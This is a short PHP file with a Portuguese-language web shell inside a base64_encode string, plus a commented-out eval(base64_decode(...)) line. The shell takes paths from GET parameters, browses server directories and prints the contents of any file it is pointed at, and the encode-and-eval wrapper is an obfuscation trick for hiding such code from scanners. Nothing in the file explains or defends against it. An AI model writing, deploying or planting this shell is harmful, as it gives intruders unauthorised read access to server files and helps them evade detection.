<?php
$encode = base64_encode('
$path = $_GET[\'v\'];
$action = $_GET[\'a\'];

echo "Servidor <br>";

if($action == true){

echo "<textarea class=\'form-control\' name=\'textl\'>";

$arquivo_edit = fopen ($action, \'r\') or die("Unable to open file!");

while( !feof($arquivo_edit)){
$linha = fgets($arquivo_edit);
echo htmlspecialchars($linha);

}

fclose($arquivo_edit);


echo "</textarea>";



}else{




if($path == false){
$path = "./";
}else{
$path = $path;
}

$diretorio = dir($path);


while($arquivo = $diretorio -> read()){

$arquivoex = substr($arquivo, strripos($arquivo, \'.\'));

if($arquivoex == ".php" or $arquivoex == ".js" or $arquivoex == ".css" or $arquivoex == ".txt"){
$mostrar = "<a href=\'shell.php?a=$path$arquivo\'>".$arquivo."</a><br>";
}else{
$mostrar = "<a href=\'shell.php?v=$path$arquivo/\'>".$arquivo."</a><br>";
}

echo $mostrar;

}
$diretorio -> close();
}


');

echo $encode;
//eval(base64_decode($encode))
?>